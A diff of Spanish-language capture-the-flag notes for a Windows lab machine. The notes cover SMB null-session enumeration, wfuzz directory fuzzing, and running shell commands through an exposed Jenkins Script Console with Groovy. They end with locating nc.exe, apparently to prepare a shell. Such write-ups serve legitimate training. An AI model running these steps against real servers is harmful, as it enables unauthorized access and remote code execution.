@@ -1,13 +1,13 @@
 ## Summary
 
+Tags: #Windows #Wfuzz  #Jenkins 
+
 - IP -> 10.10.10.63
-- Ports -> TCP (80,135,445,5000), UDP (idk)
+- Ports -> TCP (80,135,445,50000), UDP (idk)
 - OS ->  Windows
 - Services & Applications
-    - 80 -> 
-    - 135 -> 
-    - 445 ->
-    - 5000 ->
+    - 80 ->  Microsoft IIS httpd 10.0
+    - 5000 -> Http Jetty
 
 
 ## Launchpad
@@ -15,32 +15,52 @@
 -   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)
 
 ## Recon 
-- Comando -> **Whatweb < http:// IP Address>** = Microsoft IIS 10.0
-- Comando -> **Whatweb < http:// IP Address> -v** Miramos las cabeceras de la pagina web
-- Comando -> **curl -s -X GET "http://< IP>" -I** Miramos las cabeceras de la pagina web (I=i mayuscula,s=silence)
-- Comando -> **crackmapexec smb {ip_targeted}** Para listar recursos compartidos de Windows
-- Comando -> **smbclient -L < IP TARGET> -N** Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
-- Comando -> **smbmap -H** **{ip_targeted}** Herramienta elternativa para ver si nos reporta algo mas
-- Comando -> **smbmap -H** **{ip_targeted} -u 'null'** Herramienta elternativa para ver si nos reporta algo mas haciendo uso de un null sesion (sin credencial alguna)
 
-Webpage -> < IP> and < IP:5000>
+```bash 
+❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80
+❯ whatweb ❮http://IP❯ -v               # Nos dara una breve descripcion de las cabeceras 
+```
 
-- Comando -> **wfuzz -c --hc=404 -t 200 -w < RUTA DICCIONARIO> < http:// URL:PORT/FUZZ/>** Hacemos fuzing a una pagina web especifica para poder encontrar subdominios con un diccionario especifico, y el diccionario se aplicara en la palabra FUZZ (c=colorizado, w=wordlist, hc=hidecode, hh=hide characters ch en caso que sea necesario, t=tareas simultaneas). Es importante poner el nombre de la url, ya que muchas veces con la pura IP no encuentra nada. 
-	**/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 
+```bash 
+❯ curl -s -X GET http://❮IP❯ -I        # Miramos las cabeceras de respuesta de la pagina web 
 
-Descubrimos una nuerva ruta. 
+	# I = i mayuscula
+	# s = silence
+```
+
+```bash 
+❯ crackmapexec smb 10.10.10.63         # Listar los recursos del SMBv1:TRUE
+
+❯ smbclient -L ❮IP❯ -N                # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna) 
+
+❯ smbmap -H ❮IP❯ -u 'null'             # Herramienta elternativa para ver si nos reporta algo mas haciendo uso de un null sesion (sin credencial alguna)
+```
+
+Webpage -> < IP> and < IP:50000>
+
+```bash 
+❯ wfuzz -c -t 200 --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63/FUZZ
+
+❯ wfuzz -c -t 200 --hc=404 -t 200 -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
+```
+
+Descubrimos una nueva ruta. 
 Ahora toca investigar Jenkins:
 	Que es?
 	Para que sirve?
 
-El error en la web de Jenkins es que te salga la opcion: **Administrar Jenkins**
-	- Ir a consola de Scripts
+
+El error en la web de Jenkins es que te salga la opción: **Manage Jenkins**
+	- Ir a 'Script Console'
 	- Puedes crear un script en Groovy (Groovy execute shell command)
-		println "whoami".execute().text
+```bash 
+	❯ println "whoami".execute().text                    # Nos muestre el resultado de 'whoami'
+```
 
-- Comando -> **locate nc.exe**
-- Comando -> **updatedb**
-
+```bash 
+❯ locate nc.exe                       # Para buscar el Netcat en nuestra maquina de atacante 
+	❯ updatedb
+```
 
 ## User
 Webpage 
